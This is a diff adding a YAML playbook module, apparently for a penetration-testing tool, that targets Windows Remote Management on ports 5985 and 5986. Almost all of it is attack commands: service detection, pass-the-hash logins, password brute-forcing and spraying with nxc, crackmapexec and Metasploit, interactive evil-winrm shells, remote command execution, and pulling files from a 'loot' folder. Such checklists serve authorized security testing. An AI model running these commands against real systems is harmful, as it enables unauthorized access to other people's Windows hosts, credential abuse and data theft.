@@ -1,0 +1,81 @@
+module: winrm
+name: WinRM (5985 / 5986)
+inputs: [USERS, PASS, DOMAIN, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / WSMan endpoint
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          curl -s http://$IP:$PORT/wsman -X POST
+      - id: identify
+        text: Identify WSMan (unauth Identify request)
+        commands: |
+          nxc winrm $IP -u '' -p ''
+
+  - id: auth
+    name: Authentication Check
+    steps:
+      - id: valid_creds
+        text: Validate creds / find who can log in (Pwn3d = shell)
+        commands: |
+          nxc winrm $IP -u $USER -p $PASS
+          nxc winrm $IP -u $USER -p $PASS -d $DOMAIN
+      - id: pth
+        text: Pass-the-hash check
+        commands: |
+          nxc winrm $IP -u $USER -H <NThash>
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force / spray
+        commands: |
+          nxc winrm $IP -u $USERLIST -p $PASSLIST --continue-on-success
+          crackmapexec winrm $IP -u $USER -p $PASS
+      - id: brute_msf
+        text: Brute-force via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/winrm/winrm_login; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: access
+    name: Shell Access & Post-Exploitation
+    steps:
+      - id: evilwinrm
+        text: Interactive shell (HTTP 5985)
+        commands: |
+          evil-winrm -i $IP -u $USER -p '$PASS'
+          evil-winrm -i $IP -u $USER -H <NThash>
+      - id: evilwinrm_tls
+        text: Interactive shell over TLS (HTTPS 5986)
+        tls_only: true
+        commands: |
+          evil-winrm -i $IP -u $USER -p '$PASS' -S
+      - id: exec
+        text: One-shot command exec (no full shell)
+        commands: |
+          nxc winrm $IP -u $USER -p $PASS -x "whoami /all"
+          nxc winrm $IP -u $USER -p $PASS -X '$PSVersionTable'
+      - id: transfer
+        text: Upload / download inside evil-winrm
+        manual: true
+        commands: |
+          # upload /local/file C:\Windows\Temp\file
+          # download C:\loot\file /local/dest
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: shell
+        text: "Authenticated shell (password or hash)"
+        commands: |
+          evil-winrm -i $IP -u $USER -p $PASS
+          evil-winrm -i $IP -u $USER -H $NTHASH
+          nxc winrm $IP -u $USER -p $PASS
